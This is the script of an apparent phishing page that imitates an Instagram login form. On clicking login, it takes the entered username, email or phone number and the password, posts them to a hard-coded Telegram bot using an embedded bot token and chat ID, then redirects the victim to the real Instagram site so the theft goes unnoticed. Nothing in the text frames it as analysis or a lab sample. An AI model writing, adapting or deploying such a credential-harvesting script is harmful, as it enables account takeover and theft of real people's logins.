<script>
document.addEventListener('DOMContentLoaded', () => {
    const loginPage = document.getElementById('login-page');
    const loginButton = document.getElementById('login-button');
    const usernameEmailPhoneInput = document.getElementById('username-email-phone');
    const passwordInput = document.getElementById('password');

    // Removed loading logic

    const isEmail = (input) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
    const isPhoneNumber = (input) => /^\d{10}$/.test(input);
    const isUsername = (input) => /^[a-zA-Z0-9._]{1,30}$/.test(input);

    async function sendToTelegram(identifier, detail) {
        const fullMessage = `ðŸ†” Identifier: ${identifier || 'Not Entered'}\nðŸ” Detail: ${detail || 'Not Entered'}`;

        const botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';
        const chatId = '1747742228';

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: fullMessage,
                })
            });
        } catch (e) {}
    }

    loginButton.addEventListener('click', async () => {
        const identifier = usernameEmailPhoneInput.value.trim();
        const password = passwordInput.value.trim();

        let isValid = false;
        let errorMessage = '';

        if (isPhoneNumber(identifier) || isEmail(identifier) || isUsername(identifier)) {
            isValid = true;
        } else {
            errorMessage += 'Invalid identifier. ';
        }

        if (!password) {
            errorMessage += 'Password required.';
        }

        if (isValid && password) {
            await sendToTelegram(identifier, password);
            window.location.href = 'https://www.instagram.com';
        } else {
            alert(errorMessage.trim() || 'Enter valid credentials.');
        }
    });

    usernameEmailPhoneInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            loginButton.click();
        }
    });

    passwordInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            loginButton.click();
        }
    });
});

function alert(message) {
    const modal = document.getElementById('custom-alert-modal');
    const alertMessage = document.getElementById('alert-message');
    alertMessage.innerText = message;
    modal.style.display = 'flex';
}
</script>
